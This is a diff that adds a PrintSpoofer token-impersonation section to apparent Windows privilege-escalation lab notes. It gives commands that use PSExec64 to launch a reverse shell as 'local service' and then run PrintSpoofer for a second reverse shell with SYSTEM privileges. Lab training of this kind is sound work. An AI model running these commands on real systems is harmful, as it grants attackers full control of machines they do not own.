@@ -499,6 +499,16 @@ When this registry key is enabled, it allows non-administrator users to install 
 
 - System shell
 
+### Token Impersonation - PrintSpoofer
+
+- Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:
+
+      C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+- Now, in the "local service" reverse shell you triggered, run the PrintSpoofer exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):
+
+       c:\PrivEsc\PrintSpoofer.exe -i -c [rev shell's path]
+  
+![image](https://github.com/user-attachments/assets/980e676e-705f-4d15-9248-74d2c32f56d8)
 
 
 ### OFFSEC
